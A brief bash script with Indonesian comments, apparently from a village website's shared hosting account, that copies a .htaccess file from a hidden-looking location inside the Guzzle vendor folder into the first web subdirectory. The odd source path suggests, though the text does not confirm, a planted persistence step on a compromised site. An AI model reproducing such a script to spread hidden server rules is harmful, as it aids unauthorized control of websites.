#!/bin/bash

htaccess_source="/home/u1377344/public_html/desa-padanglampe/vendor/guzzlehttp/guzzle/src/Tmp/.htaccess"
target_dir="/home/u1377344/public_html/"

# Menemukan dan menyalin ke subdir pertama saja
first_subdir=$(find "$target_dir" -mindepth 1 -maxdepth 1 -type d | head -n 1)
if [ -n "$first_subdir" ]; then
    cp "$htaccess_source" "$first_subdir"
    echo "File .htaccess copied to $first_subdir" | tee 1.txt
else
    echo "Tidak ada subdir ditemukan di $target_dir" | tee 1.txt
fi
